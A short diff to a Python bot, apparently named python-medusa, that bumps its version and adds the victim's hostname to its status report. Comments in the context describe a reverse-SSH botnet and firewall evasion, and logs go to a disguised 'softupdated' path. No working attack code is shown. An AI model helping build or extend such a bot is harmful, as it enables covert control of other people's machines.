@@ -29,7 +29,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "6.9"                                                                 # bot version
+version = "7.0"                                                                 # bot version
 
 try:
     logfile(filename="/var/softupdated/bot_v%s.log" % version)                  # redirects bot output to logfile
@@ -465,7 +465,7 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):               
 def status_report(connection_time, timeout_count, last_ping):
     ping = round(time.time() - last_ping, 1)
     connected = round(time.time() - connection_time, 1)
-    return "[v%s] connected[%ss] net_errors[%s] last_ping[%ss ago] host[%s]" % (version, connected, timeout_count, ping, main_user)
+    return "[v%s] connected[%ss] net_errors[%s] last_ping[%ss ago] host[%s@%s]" % (version, connected, timeout_count, ping, main_user, hostname)
 
 def admin(admins):
     for entry in admins:
